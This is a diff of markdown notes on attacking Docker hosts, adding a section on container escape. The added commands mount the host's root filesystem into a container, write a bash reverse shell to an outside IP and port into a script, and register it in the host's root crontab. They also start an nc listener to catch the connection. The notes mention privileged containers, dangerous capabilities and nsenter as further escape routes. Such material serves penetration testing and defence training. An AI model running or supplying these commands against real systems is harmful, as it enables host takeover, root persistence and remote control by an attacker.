@@ -48,7 +48,7 @@ https://github.com/JavierOlmedo/shodan-filters
 
 https://github.com/weaveworks/scope
 
-scope launch -app.http.address 0.0.0.0:4040
+https://github.com/danielmiessler/SecLists
 
 apk add docker
 apk add libcap
@@ -59,6 +59,35 @@ You can run privileged containers, containers with hostpid, hostipc, etc. You ca
 Or leverage capablities like  CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_SYS_RAWIO, CAP_NET_ADMIN, etc.
 
 You can also use tools like `nsenter` to create namespaces in linux
+
+How to know if you are inside a container or on a host machine?
+
+```bash
+ls -l /var/lib/docker
+```
+
+```bash
+docker run --rm -it -v /:/abcd ubuntu bash
+# ls -l /abcd/var/lib/docker
+# hostname
+```
+
+Let's leverage the functionality of cronjob in linux to get a reverse shell
+
+```bash
+docker run --rm -it -v /:/abcd ubuntu bash
+# ls -l /abcd/var/lib/docker
+# hostname
+# echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /abcd/tmp/run.sh
+# chmod +x /abcd/tmp/run.sh
+# echo "*  *    * * *   root    bash /tmp/run.sh" >> /abcd/etc/crontab
+```
+
+On `18.141.250.7`, wait for incoming connection
+
+```bash
+nc -nlvp 8888
+```
 
 ### Attack Mitre framework
 
